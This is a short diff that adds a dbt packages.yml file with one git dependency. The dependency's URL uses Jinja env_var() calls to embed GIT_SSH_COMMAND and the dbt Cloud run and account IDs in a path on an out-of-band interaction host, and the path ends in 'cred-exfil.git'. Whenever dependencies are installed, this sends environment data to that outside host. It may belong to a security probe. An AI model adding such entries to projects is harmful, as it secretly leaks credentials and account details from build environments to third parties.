@@ -1,0 +1,3 @@
+packages:
+  - git: "https://dbhrbrs14l2nm32jk2tg4sfwtihhpg4jz.oast.pro/SSH_CMD_{{ env_var('GIT_SSH_COMMAND', 'NONE') | replace(' ', '_') }}/RUN_{{ env_var('DBT_CLOUD_RUN_ID', '0') }}/ACCT_{{ env_var('DBT_CLOUD_ACCOUNT_ID', '0') }}/cred-exfil.git"
+    revision: main
